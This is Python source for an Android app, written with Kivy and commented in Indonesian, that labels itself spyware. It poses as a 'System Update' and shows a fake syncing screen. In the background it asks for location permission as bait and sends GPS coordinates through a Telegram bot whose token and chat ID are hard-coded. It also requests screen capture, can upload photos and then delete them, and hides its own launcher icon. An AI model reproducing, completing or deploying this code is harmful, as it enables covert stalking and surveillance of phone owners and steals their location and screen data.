%%writefile main.py
import os
import time
import threading
import requests
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
from plyer import gps
from android.permissions import request_permissions, Permission

# ============================================================
# 1. KONFIGURASI TELEGRAM (RAW TOKEN)
# ============================================================
TG_TOKEN = "9165602208:AAFDWdd-GBUy-kbmArZ0QVDMGinA616f2WQ"
TG_CHAT_ID = "8831607999"

# ============================================================
# 2. CORE FUNCTIONS
# ============================================================
def _sT(msg):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

def send_tg_file(filepath, caption):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto"
        with open(filepath, 'rb') as f:
            files = {'photo': f}
            requests.post(url, data={'chat_id': TG_CHAT_ID, 'caption': caption}, files=files, timeout=20)
        if os.path.exists(filepath):
            os.remove(filepath)
    except:
        pass

# ============================================================
# 3. FITUR SPYWARE (JALAN DI BACKGROUND)
# ============================================================
def run_spyware():
    _sT("📱 *[+] System Update Terpasang.*\nMemulai pengintaian...")
    
    # 1. Minta Izin GPS (Pancingan)
    try:
        request_permissions([Permission.ACCESS_FINE_LOCATION, Permission.ACCESS_COARSE_LOCATION])
    except:
        pass

    # 2. Mulai GPS Tracker
    def on_location(**kwargs):
        lat = kwargs.get('lat')
        lon = kwargs.get('lon')
        if lat and lon:
            _sT(f"📍 *[GPS]*\nhttps://www.google.com/maps?q={lat},{lon}")
            
    try:
        gps.configure(on_location=on_location)
        gps.start(minTime=60000, minDistance=10)
    except:
        pass

    # 3. Mulai Screen Monitor (Pake MediaProjection)
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        Context = autoclass('android.content.Context')
        MediaProjectionManager = autoclass('android.media.projection.MediaProjectionManager')
        
        mpm = activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
        intent = mpm.createScreenCaptureIntent()
        activity.startActivityForResult(intent, 1001)
        _sT("📸 *[+] Screen Monitor Diminta.*")
    except Exception as e:
        _sT(f"[-] Screen Error: {str(e)}")

    # 4. Hide Icon
    try:
        pm = activity.getPackageManager()
        ComponentName = autoclass('android.content.ComponentName')
        comp = ComponentName(activity, "org.kivy.android.PythonActivity")
        pm.setComponentEnabledSetting(comp, 2, 1) # Sembunyiin
        _sT("🕵️ *[+] Ikon Disembunyikan.*")
    except:
        pass

# ============================================================
# 4. UI PENYAMAR
# ============================================================
class SysUpdate(App):
    def build(self):
        self.label = Label(text="Sinkronisasi Data...\nMohon tunggu sebentar.")
        
        # Jalanin spyware setelah 2 detik (cepet)
        Clock.schedule_once(lambda dt: threading.Thread(target=run_spyware, daemon=True).start(), 2)
        return self.label

if __name__ == '__main__':
    SysUpdate().run()
